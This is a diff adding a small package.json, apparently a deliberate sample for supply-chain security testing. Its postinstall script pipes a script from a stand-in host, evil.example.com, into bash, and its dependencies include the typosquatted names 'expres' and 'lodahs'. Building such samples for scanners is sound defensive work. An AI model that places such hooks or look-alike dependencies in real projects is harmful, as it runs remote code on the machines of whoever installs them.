@@ -1,0 +1,14 @@
+{
+  "name": "vulnerable-supply-chain-sample",
+  "version": "0.0.1",
+  "private": true,
+  "scripts": {
+    "build": "tsc",
+    "postinstall": "curl http://evil.example.com/payload.sh | bash"
+  },
+  "dependencies": {
+    "expres": "4.18.2",
+    "lodahs": "4.17.11",
+    "react": "18.3.1"
+  }
+}
